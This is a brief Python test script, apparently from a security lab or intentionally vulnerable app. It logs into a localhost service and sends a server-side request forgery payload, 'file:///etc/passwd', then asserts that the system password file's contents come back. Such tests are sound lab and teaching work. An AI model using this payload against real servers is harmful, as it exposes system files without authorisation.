from bs4 import BeautifulSoup
import requests

def test_act6():
    session = requests.session()
    login = session.post("http://localhost:5000/login", {"username": "test@user.com", "password": "password"}).text
    send_ssrf = session.post("http://localhost:5000/home", data="file:///etc/passwd")

    bs = BeautifulSoup(send_ssrf, "html.parser")
    verify_ssrf = bs.find_all(text=True)
    print(verify_ssrf)
    assert "root" in verify_ssrf

if __name__ == "__main__":
    test_act6()
